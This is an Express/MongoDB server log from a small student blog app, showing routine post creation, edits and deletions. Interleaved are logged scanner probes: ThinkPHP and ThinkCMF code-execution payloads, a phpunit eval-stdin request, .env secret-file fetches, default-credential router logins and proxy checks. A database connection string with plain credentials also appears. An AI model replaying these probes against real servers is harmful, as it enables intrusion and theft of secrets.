    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  },
  {
    _id: 5f84997552b6272d0e0bb1d3,
    blogTitle: 'Added by Prof Rogers',
    blogText: 'Test',
    createdOn: 2020-10-12T17:59:17.163Z,
    __v: 0
  }
]
GET /api/blogs 200 506 - 2.807 ms
GET /bloglist 200 4413 - 5.800 ms
GET /favicon.ico - - - - ms
GET /css/fontawesome-all.css 200 51609 - 0.783 ms
GET /stylesheets/style.css 304 - - 0.309 ms
GET /css/bootstrap.min.css 304 - - 1.166 ms
GET /js/bootstrap.min.js 304 - - 0.988 ms
GET /js/jquery.min.js 304 - - 1.660 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 0.560 ms
{
  _id: 5f84997552b6272d0e0bb1d3,
  blogTitle: 'Added by Prof Rogers',
  blogText: 'Test',
  createdOn: 2020-10-12T17:59:17.163Z,
  __v: 0
}
GET /api/blogs/5f84997552b6272d0e0bb1d3 200 134 - 2.611 ms
GET /blogedit/5f84997552b6272d0e0bb1d3 200 1454 - 6.018 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.313 ms
GET /js/bootstrap.min.js 304 - - 0.812 ms
GET /css/bootstrap.min.css 304 - - 0.817 ms
GET /js/jquery.min.js 304 - - 0.497 ms
Updating a blog entry with id of 5f84997552b6272d0e0bb1d3
(node:11534) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
PUT /api/blogs/5f84997552b6272d0e0bb1d3 201 134 - 6.123 ms
POST /blogedit/5f84997552b6272d0e0bb1d3 302 62 - 9.363 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  },
  {
    _id: 5f84997552b6272d0e0bb1d3,
    blogTitle: 'Added by Prof Rogers',
    blogText: 'Test!',
    createdOn: 2020-10-12T17:59:17.163Z,
    __v: 0
  }
]
GET /api/blogs 200 507 - 2.728 ms
GET /bloglist 200 4414 - 6.824 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.313 ms
GET /css/bootstrap.min.css 304 - - 0.540 ms
GET /css/fontawesome-all.css 304 - - 1.218 ms
GET /js/bootstrap.min.js 304 - - 0.542 ms
GET /js/jquery.min.js 304 - - 1.184 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.401 ms
{
  _id: 5f84997552b6272d0e0bb1d3,
  blogTitle: 'Added by Prof Rogers',
  blogText: 'Test!',
  createdOn: 2020-10-12T17:59:17.163Z,
  __v: 0
}
GET /api/blogs/5f84997552b6272d0e0bb1d3 200 135 - 3.611 ms
GET /blogdelete/5f84997552b6272d0e0bb1d3 200 1481 - 7.099 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.337 ms
GET /css/bootstrap.min.css 304 - - 0.791 ms
GET /js/jquery.min.js 304 - - 0.922 ms
GET /js/bootstrap.min.js 304 - - 0.390 ms
Deleting blog entry with id of 5f84997552b6272d0e0bb1d3
{}
DELETE /api/blogs/5f84997552b6272d0e0bb1d3 204 - - 2.393 ms
POST /blogdelete/5f84997552b6272d0e0bb1d3 302 62 - 5.286 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  }
]
GET /api/blogs 200 418 - 3.777 ms
GET /bloglist 200 3713 - 6.835 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.323 ms
GET /css/bootstrap.min.css 304 - - 0.821 ms
GET /css/fontawesome-all.css 304 - - 0.901 ms
GET /js/jquery.min.js 304 - - 0.474 ms
GET /js/bootstrap.min.js 304 - - 0.388 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.394 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  }
]
GET /api/blogs 200 418 - 2.941 ms
GET /favicon.ico - - - - ms
GET /favicon.ico - - - - ms
GET /solr/admin/info/system?wt=json 404 1418 - 0.956 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.990 ms
GET / 200 826 - 0.920 ms
GET / 200 826 - 0.981 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.997 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 1418 - 1.055 ms
HEAD /robots.txt 404 1418 - 0.943 ms
GET / 200 826 - 0.929 ms
GET / 200 826 - 1.606 ms
GET /nmaplowercheck1602543155 404 1418 - 0.967 ms
GET /HNAP1 404 1418 - 0.965 ms
GET /evox/about 404 1418 - 1.039 ms
POST /sdk 404 1413 - 0.812 ms
POST /api/jsonws/invoke 404 1406 - 0.976 ms
POST /goform/webLogin 404 1413 - 1.115 ms
GET /portal/redlion 404 1418 - 0.966 ms
GET / 200 826 - 1.680 ms
GET / 200 826 - 0.919 ms
GET /.env 404 1418 - 0.878 ms
POST / 404 1413 - 1.044 ms
GET / 200 826 - 0.980 ms
GET / 200 826 - 0.843 ms
GET / 200 826 - 0.996 ms
GET http://163.172.88.110:41298/1.txt 404 1418 - 1.001 ms
GET http://163.172.88.110:41298/1.txt 404 1418 - 0.956 ms
GET http://163.172.88.110:41298/1.txt 404 1418 - 0.951 ms
GET / 200 826 - 0.906 ms
GET /pv/000000000000.cfg 404 1418 - 1.053 ms
GET / 200 826 - 0.986 ms
GET / 200 826 - 0.969 ms
GET / 200 826 - 7.496 ms
GET / 200 826 - 0.918 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 0.926 ms
HEAD / 200 826 - 1.562 ms
POST / 404 1413 - 0.857 ms
GET /muieblackcat 404 1418 - 0.952 ms
GET //phpMyAdmin/scripts/setup.php 404 1418 - 0.923 ms
GET //phpmyadmin/scripts/setup.php 404 1418 - 0.910 ms
GET //pma/scripts/setup.php 404 1418 - 4.509 ms
GET //myadmin/scripts/setup.php 404 1418 - 0.931 ms
GET //MyAdmin/scripts/setup.php 404 1418 - 0.947 ms
GET /.env 404 1418 - 0.904 ms
POST / 404 1413 - 0.924 ms
GET / 200 826 - 0.973 ms
HEAD /robots.txt 404 1418 - 0.951 ms
GET http://example.com/ 200 826 - 0.920 ms
GET / 200 826 - 1.010 ms
GET / 200 826 - 1.442 ms
GET /ReportServer 404 1418 - 0.984 ms
GET / 200 826 - 0.906 ms
POST /GponForm/diag_Form?images/ 404 1413 - 0.784 ms
GET / 200 826 - 0.884 ms
POST /HNAP1/ 404 1413 - 0.967 ms
GET / 200 826 - 27.448 ms
GET / 200 826 - 0.709 ms
GET / 200 826 - 1.523 ms
GET /hudson 404 1418 - 1.916 ms
GET / 200 826 - 0.904 ms
GET / 200 826 - 1.499 ms
GET /.env 404 1418 - 0.995 ms
POST / 404 1413 - 1.520 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1418 - 1.014 ms
GET / 200 826 - 0.903 ms
GET / 200 826 - 0.886 ms
GET / 200 826 - 1.065 ms
(node:14688) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:14688) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:blogs@localhost/blogger
GET / 200 5646 - 6.463 ms
GET /js/angular.min.js 304 - - 1.199 ms
GET /stylesheets/style.css 304 - - 0.361 ms
GET /css/bootstrap.min.css 304 - - 0.492 ms
GET /css/fontawesome-all.css 304 - - 0.798 ms
GET /js/angular-route.min.js 304 - - 1.158 ms
GET /js/angular-ui-router.min.js 304 - - 1.215 ms
GET /js/bloggerApp.js 304 - - 0.656 ms
GET /favicon.ico 200 5646 - 0.839 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 24.652 ms
GET /favicon.ico 304 - - 14.638 ms
GET /pages/blog-list.html 200 5646 - 15.235 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.641 ms
GET /favicon.ico 304 - - 0.632 ms
{ blogTitle: 'Final test', blogText: 'here we go\n' }
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'here we go\n',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
POST /api/blogs/ 201 132 - 21.259 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  },
  {
    _id: 5f920eff6a0e91396006a8ed,
    blogTitle: 'Final test',
    blogText: 'here we go\n',
    createdOn: 2020-10-22T23:00:15.981Z,
    __v: 0
  }
]
GET /api/blogs 200 488 - 3.963 ms
GET /favicon.ico 304 - - 0.687 ms
GET /favicon.ico 304 - - 3.560 ms
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'here we go\n',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
GET /api/blogs/5f920eff6a0e91396006a8ed 200 132 - 7.250 ms
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'here we go\n',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
GET /api/blogs/5f920eff6a0e91396006a8ed 304 - - 2.350 ms
Updating a blog entry with id of 5f920eff6a0e91396006a8ed
(node:14688) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
PUT /api/blogs/5f920eff6a0e91396006a8ed 201 132 - 6.850 ms
GET /favicon.ico 304 - - 0.660 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  },
  {
    _id: 5f920eff6a0e91396006a8ed,
    blogTitle: 'Final test',
    blogText: 'I edited',
    createdOn: 2020-10-22T23:00:15.981Z,
    __v: 0
  }
]
GET /api/blogs 200 484 - 3.440 ms
GET /favicon.ico 304 - - 3.650 ms
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'I edited',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
GET /api/blogs/5f920eff6a0e91396006a8ed 200 128 - 3.187 ms
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'I edited',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
GET /api/blogs/5f920eff6a0e91396006a8ed 304 - - 2.204 ms
{
  _id: 5f920eff6a0e91396006a8ed,
  blogTitle: 'Final test',
  blogText: 'I edited',
  createdOn: 2020-10-22T23:00:15.981Z,
  __v: 0
}
GET /api/blogs/5f920eff6a0e91396006a8ed 304 - - 2.207 ms
Deleting blog entry with id of 5f920eff6a0e91396006a8ed
{}
DELETE /api/blogs/5f920eff6a0e91396006a8ed 204 - - 2.717 ms
Getting blog list
GET /favicon.ico 304 - - 1.775 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 200 363 - 3.963 ms
GET /favicon.ico 304 - - 0.562 ms
GET / 304 - - 0.649 ms
GET /js/angular.min.js 304 - - 1.577 ms
GET /stylesheets/style.css 304 - - 0.380 ms
GET /css/bootstrap.min.css 304 - - 0.443 ms
GET /css/fontawesome-all.css 304 - - 0.552 ms
GET /js/angular-route.min.js 304 - - 0.533 ms
GET /js/angular-ui-router.min.js 304 - - 0.596 ms
GET /js/bloggerApp.js 304 - - 0.455 ms
GET /favicon.ico 304 - - 0.487 ms
GET / 304 - - 0.572 ms
GET /js/angular.min.js 304 - - 0.643 ms
GET /stylesheets/style.css 304 - - 0.379 ms
GET /css/bootstrap.min.css 304 - - 0.454 ms
GET /css/fontawesome-all.css 304 - - 0.586 ms
GET /js/angular-route.min.js 304 - - 0.773 ms
GET /js/angular-ui-router.min.js 304 - - 0.519 ms
GET /js/bloggerApp.js 304 - - 0.528 ms
GET /favicon.ico 304 - - 0.588 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.237 ms
GET /pages/blog-list.html 304 - - 0.487 ms
GET /favicon.ico 304 - - 0.448 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.506 ms
GET /favicon.ico 304 - - 0.548 ms
GET /favicon.ico 304 - - 0.580 ms
GET / 304 - - 0.559 ms
GET /js/angular.min.js 304 - - 0.564 ms
GET /css/bootstrap.min.css 304 - - 0.678 ms
GET /stylesheets/style.css 304 - - 0.352 ms
GET /css/fontawesome-all.css 304 - - 0.571 ms
GET /js/angular-ui-router.min.js 304 - - 1.099 ms
GET /js/angular-route.min.js 304 - - 1.102 ms
GET /js/bloggerApp.js 304 - - 0.425 ms
GET /favicon.ico 200 5646 - 0.972 ms
Getting blog list
GET /pages/blog-list.html 304 - - 1.855 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 4.197 ms
GET /favicon.ico 304 - - 0.445 ms
GET /webfonts/fa-solid-900.woff2 304 - - 1.581 ms
GET /favicon.ico 304 - - 0.627 ms
Getting blog list
GET /favicon.ico 304 - - 2.936 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 5.137 ms
GET /favicon.ico 304 - - 0.586 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.031 ms
GET /favicon.ico 304 - - 0.519 ms
GET /favicon.ico 304 - - 0.597 ms
Getting blog list
GET /favicon.ico 304 - - 2.109 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.324 ms
GET /favicon.ico 304 - - 0.608 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 2.862 ms
GET /favicon.ico 304 - - 0.445 ms
GET /favicon.ico 304 - - 0.636 ms
Getting blog list
GET /favicon.ico 304 - - 1.697 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.973 ms
GET /favicon.ico 304 - - 0.541 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 2.914 ms
GET /favicon.ico 304 - - 0.452 ms
GET /favicon.ico 304 - - 0.629 ms
Getting blog list
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 2.814 ms
GET /favicon.ico 304 - - 0.435 ms
GET /favicon.ico 304 - - 0.573 ms
Getting blog list
GET /favicon.ico 304 - - 2.193 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.392 ms
GET /favicon.ico 304 - - 1.391 ms
Getting blog list
GET /favicon.ico 304 - - 1.661 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.806 ms
GET /favicon.ico 304 - - 0.563 ms
Getting blog list
GET /favicon.ico 304 - - 1.637 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.754 ms
GET /favicon.ico 304 - - 0.611 ms
Getting blog list
GET /favicon.ico 304 - - 1.660 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.809 ms
GET /favicon.ico 304 - - 0.612 ms
Getting blog list
GET /favicon.ico 304 - - 2.642 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 4.702 ms
GET /favicon.ico 304 - - 0.586 ms
Getting blog list
GET /favicon.ico 304 - - 1.713 ms
[
  {
    _id: 5f920ae79feec0351d4d980e,
    blogTitle: 'This is a blog',
    blogText: 'cool!',
    createdOn: 2020-10-22T22:42:47.304Z,
    __v: 0
  },
  {
    _id: 5f920b407d3ee7355b5cad7f,
    blogTitle: 'Another blog',
    blogText: 'very cool!',
    createdOn: 2020-10-22T22:44:16.136Z,
    __v: 0
  },
  {
    _id: 5f920c297d3ee7355b5cad80,
    blogTitle: 'Testing',
    blogText: '1 2 3',
    createdOn: 2020-10-22T22:48:09.587Z,
    __v: 0
  }
]
GET /api/blogs 304 - - 3.917 ms
GET / 200 5646 - 0.847 ms
GET / 200 5646 - 1.271 ms
GET / 200 5646 - 0.789 ms
GET / 200 5646 - 0.769 ms
GET / 200 5646 - 0.673 ms
GET /ab2h 200 5646 - 0.934 ms
GET /ab2g 200 5646 - 0.594 ms
GET /requested.html 200 5646 - 0.542 ms
POST /editBlackAndWhiteList - - - - ms
Error: No default engine was specified and no extension was provided.
    at new View (/home/bitnami/lab5/node_modules/express/lib/view.js:61:11)
    at Function.render (/home/bitnami/lab5/node_modules/express/lib/application.js:570:12)
    at ServerResponse.render (/home/bitnami/lab5/node_modules/express/lib/response.js:1008:7)
    at /home/bitnami/lab5/app.js:53:7
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:71:5)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at Layer.handle_error (/home/bitnami/lab5/node_modules/express/lib/router/layer.js:67:12)
    at trim_prefix (/home/bitnami/lab5/node_modules/express/lib/router/index.js:315:13)
    at /home/bitnami/lab5/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/home/bitnami/lab5/node_modules/express/lib/router/index.js:335:12)
    at next (/home/bitnami/lab5/node_modules/express/lib/router/index.js:275:10)
    at /home/bitnami/lab5/node_modules/express/lib/response.js:435:7
    at onerror (/home/bitnami/lab5/node_modules/express/lib/response.js:1040:5)
GET /TP/public/index.php 200 5646 - 0.734 ms
GET /TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 200 5646 - 0.732 ms
GET / 200 5646 - 0.724 ms
GET / 200 5646 - 0.700 ms
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 200 5646 - 0.751 ms
GET / 200 5646 - 0.714 ms
GET / 200 5646 - 0.767 ms
GET / 200 5646 - 0.598 ms
GET / 200 5646 - 0.707 ms
GET / 200 5646 - 0.725 ms
GET /.env 200 5646 - 0.827 ms
POST / 200 5646 - 1.072 ms
GET / 200 5646 - 0.722 ms
GET / 200 5646 - 0.663 ms
GET / 200 5646 - 0.717 ms
GET / 200 5646 - 0.718 ms
POST /editBlackAndWhiteList - - - - ms
Error: No default engine was specified and no extension was provided.
